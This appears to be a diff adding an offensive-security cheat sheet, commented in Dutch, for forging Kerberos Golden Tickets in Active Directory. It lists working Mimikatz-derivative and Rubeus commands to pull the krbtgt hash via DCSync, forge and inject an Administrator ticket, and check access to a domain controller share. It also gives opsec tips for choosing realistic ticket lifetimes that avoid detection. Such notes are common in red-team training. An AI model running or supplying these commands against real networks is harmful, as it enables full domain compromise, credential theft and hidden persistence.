@@ -1,0 +1,14 @@
+# Golden Ticket - TGT forgery met krbtgt hash (DA nodig)
+# Stap 1: krbtgt hash + domain SID ophalen via DCSync
+C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:domain\krbtgt" "exit"
+# Of: Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\krbtgt"'
+# Stap 2: Golden Ticket aanmaken + injecteren (AES256 = meer opsec)
+C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:domain.local /sid:S-1-5-21-DOMAIN-SID /aes256:KRBTGT_AES256_KEY /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
+# Met RC4 (minder opsec, meer compatibel):
+C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:domain.local /sid:S-1-5-21-DOMAIN-SID /rc4:KRBTGT_NTLM_HASH /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
+# Stap 3: Verifieer toegang
+ls \\dc01.domain.local\c$
+# Via Rubeus (opslaan als .kirbi):
+.\Rubeus.exe golden /aes256:KRBTGT_AES256_KEY /user:Administrator /domain:domain.local /sid:S-1-5-21-DOMAIN-SID /nowrap
+# Tip: Golden Ticket overleeft wachtwoord reset - alleen krbtgt 2x resetten helpt
+# Tip: /startoffset:0 /endin:600 /renewmax:10080 = realistischere ticket lifetime
